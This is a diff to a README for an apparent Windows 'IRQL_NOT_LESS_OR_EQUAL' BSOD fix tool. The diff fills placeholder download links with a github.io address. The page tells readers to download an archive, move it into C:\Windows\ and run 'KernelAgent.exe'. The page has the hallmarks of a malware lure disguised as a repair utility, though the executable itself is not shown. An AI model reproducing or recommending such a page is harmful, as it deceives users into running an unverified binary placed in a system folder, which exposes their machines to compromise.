@@ -2,7 +2,8 @@
 
 This tool helps resolve the IRQL_NOT_LESS_OR_EQUAL BSOD on Windows 10/11. It targets driver conflicts, invalid memory access, and system-level timing issues.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-irql-not-less-or-equal-windows.github.io/.github
+)
 
 ---
 
@@ -17,7 +18,8 @@ This tool helps resolve the IRQL_NOT_LESS_OR_EQUAL BSOD on Windows 10/11. It tar
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-irql-not-less-or-equal-windows.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
